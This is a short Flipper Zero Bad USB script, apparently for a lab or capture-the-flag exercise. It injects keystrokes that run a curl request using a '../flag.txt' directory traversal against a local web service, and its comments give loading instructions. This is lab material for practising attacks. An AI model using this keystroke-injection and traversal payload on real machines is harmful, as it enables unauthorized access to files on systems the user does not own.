REM Flipper Zero Bad USB — exfil flag.txt via directory traversal
REM Flipper types a curl command that exploits the /files traversal vulnerability.
REM The flag lives inside the Docker container — the Pi's real filesystem is untouched.
REM
REM HOW TO LOAD: copy this file to /SD/badusb/ on your Flipper SD card.
REM Plug Flipper into Pi USB, then: Bad USB -> exfil_flag -> Run

DELAY 1000
STRING curl -s "http://localhost:5000/files?file=../flag.txt"
ENTER
